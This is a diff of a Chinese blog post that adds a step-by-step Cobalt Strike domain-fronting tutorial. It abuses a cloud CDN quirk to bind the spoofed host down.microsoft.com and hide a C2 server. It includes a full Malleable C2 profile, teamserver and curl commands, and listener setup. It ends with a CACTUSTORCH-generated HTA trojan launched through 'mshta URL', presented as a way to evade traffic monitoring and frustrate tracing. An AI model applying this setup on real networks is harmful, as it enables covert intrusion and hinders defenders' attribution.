@@ -23,8 +23,16 @@
 <meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623124034561.png">
 <meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623124749564.png">
 <meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623124917562.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623133118797.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623171710392.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623171804043.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623172118816.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200624154316793.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200624154400777.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200624154812836.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200624155802896.png">
 <meta property="article:published_time" content="2020-06-22T08:34:25.000Z">
-<meta property="article:modified_time" content="2020-06-23T04:59:07.602Z">
+<meta property="article:modified_time" content="2020-06-24T08:07:12.370Z">
 <meta property="article:author" content="腾小飞的博客">
 <meta property="article:tag" content="cobaltstrike">
 <meta property="article:tag" content="域前置">
@@ -195,7 +203,7 @@
 <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Domain Fronting的原理如下</p>
 <p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623114046546.png" alt="image-20200623114046546"></p>
 <p>大概意思是CDN会通过不同的HOST的头来区分把数据转发到哪里</p>
-<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>这里通过以下域名进行测试</p>
+<h3 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a>实验1</h3><p>这里通过以下域名进行测试</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup klst.96jm.com</span><br><span class="line"></span><br><span class="line">nslookup www.shhorse.com.cn</span><br></pre></td></tr></table></figure>
 
 <p>通过nslookup查看，可看到两个站是接的同一批CDN</p>
@@ -210,7 +218,6 @@
 
 <p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623124034561.png" alt="image-20200623124034561"></p>
 <p>以上的请求说明了两个站不同的返回内容</p>
-<p><u></u></p>
 <p>上面nslookup可看到CDN地址，随便取一个进行请求，返回403，说明并未解析到上面两个任何一个网站</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 120.221.30.218</span><br></pre></td></tr></table></figure>
 
@@ -220,6 +227,42 @@
 
 <p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623124917562.png" alt="image-20200623124917562"></p>
 <p>这里可以看到和上面直接请求域名返回的结果是一样的，也正因为这个特性，我们可以通过判断host头，把数据转发到我们的CC主机，从而隐藏自己的IP信息</p>
+<h3 id="实验2"><a href="#实验2" class="headerlink" title="实验2"></a>实验2</h3><p>正常情况下，第一步我们要做的是先申请一个域名（这个域名的作用是用来配合 CDN 来隐藏我们的C2服务器），然后再申请一个CDN对我们的所申请的域名进行加速，在这个过程中CDN会要求我们在域名的解析配置中设置相应的 CNAME。</p>
+<p>某云有一个的特点：当 CDN 配置中的源 IP 为自己云的服务器时，加速时会跳过对域名的检验，直接与配置中的域名绑定的源服务器IP进行通信。换言之，只要我们的C2服务器属于该云的服务器，那么我们就无需申请域名，只需要在申请 CDN 时随便填一个没有人绑定过的域名就好了，而且这个域名我们可以填成任何高信誉的域名，例如 test.microsoft.com、oops.microsoft.com…</p>
+<p>这里我使用了down.microsoft.com,直接去申请cdn就可以了</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623133118797.png" alt="image-20200623133118797"></p>
+<p>申请完等一会即可开通</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623171710392.png" alt="image-20200623171710392"></p>
+<p>CDN申请完编辑CS的<a href="https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile" target="_blank" rel="noopener">C2文件</a>，替换HOST内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># Amazon browsing traffic profile</span><br><span class="line">#</span><br><span class="line"># Author: @harmj0y</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter    &quot;50&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; Trident&#x2F;7.0; rv:11.0) like Gecko&quot;;</span><br><span class="line"></span><br><span class="line"># what else would we spawn to?</span><br><span class="line">set spawnto_x86 &quot;%windir%\\syswow64\\notepad.exe&quot;;</span><br><span class="line">set spawnto_x64 &quot;%windir%\\sysnative\\notepad.exe&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;s&#x2F;ref&#x3D;nb_sb_noss_1&#x2F;167-3294888-0262949&#x2F;field-keywords&#x3D;books&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;down.microsoft.com&quot;;</span><br><span class="line"></span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;session-token&#x3D;&quot;;</span><br><span class="line">            prepend &quot;skin&#x3D;noskin;&quot;;</span><br><span class="line">            append &quot;csm-hit&#x3D;s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THKUYEZKCKPGY5T42PZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo&#x3D;&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;Content-Encoding&quot; &quot;gzip&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;N4215&#x2F;adj&#x2F;MS.us.sr.aps&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;xml&quot;;</span><br><span class="line">        header &quot;X-Requested-With&quot; &quot;XMLHttpRequest&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;down.microsoft.com&quot;;</span><br><span class="line"></span><br><span class="line">        parameter &quot;sz&quot; &quot;160x600&quot;;</span><br><span class="line">        parameter &quot;oe&quot; &quot;oe&#x3D;ISO-8859-1;&quot;;</span><br><span class="line"></span><br><span class="line">        id &#123;</span><br><span class="line">            parameter &quot;sn&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parameter &quot;s&quot; &quot;3717&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THK9YEZJCKPGY5T42OZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo&#x3D;&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;x-ua-compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用以下命令启动cs，默认端口可以使用vim打开teamserver修改，这里踩了个坑，使用nohup启动报错，一顿搜索是bash和sh的兼容性问题，所以前面加上bash即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup bash .&#x2F;teamserver IP 密码 C2文件 &amp;</span><br></pre></td></tr></table></figure>
+
+<p>然后打开CS的web日志窗口，在cmd下执行以下操作，IP用nslookup查看一下CDN地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup down.microsoft.com.w.kunlunca.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623171804043.png" alt="image-20200623171804043"></p>
+<p>执行以下命令 域名写自己的域名，执行后看CS中的web日志是否有反应，如果有反应说明转发成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 183.203.69.10 -H &quot;host:down.microsoft.com&quot; -v</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623172118816.png" alt="image-20200623172118816"></p>
+<p>确定可以通讯可开始建立监听  主机名称写域名 端口写注册域名时候填的端口  IP写CDN地址</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200624154316793.png" alt="image-20200624154316793"></p>
+<p>点击save后，填写CDN的IP地址，可以填写多个以逗号隔开</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200624154400777.png" alt="image-20200624154400777"></p>
+<p>创建完成监听器后需要在<a href="https://github.com/mdsecactivebreach/CACTUSTORCH" target="_blank" rel="noopener">这里</a>下载脚本，据别的文章说CS默认生成的Agent会崩溃，下载完成后点击脚本管理器，载入.cna后缀的文件即，会多出一个选项</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200624154812836.png" alt="image-20200624154812836"></p>
+<p>点击该选项，生成HTA的木马（这里应该还可以生成别的类型绕过杀软的，后续再做研究）</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200624155802896.png" alt="image-20200624155802896"></p>
+<p>生成后使用以下命令可直接上线</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta URL</span><br></pre></td></tr></table></figure>
+
+<p>使用Whireshark抓包抓到的通讯数据是和CDN之间的，且HOST是我们创建的域名，这样可绕过一些流量监测设备，也可给溯源人员带来一些困难</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.anquanke.com/post/id/195011#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/195011#h2-1</a></p>
+<p><a href="https://www.lz1y.cn/2019/03/21/红队基础建设-隐藏你的C2-server/" target="_blank" rel="noopener">https://www.lz1y.cn/2019/03/21/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E5%BB%BA%E8%AE%BE-%E9%9A%90%E8%97%8F%E4%BD%A0%E7%9A%84C2-server/</a></p>
+<p><a href="http://www.secwk.com/2020/02/20/16248/" target="_blank" rel="noopener">http://www.secwk.com/2020/02/20/16248/</a></p>
+<p><a href="https://evi1cg.me/archives/AMSI_bypass.html" target="_blank" rel="noopener">https://evi1cg.me/archives/AMSI_bypass.html</a></p>
 
       
 
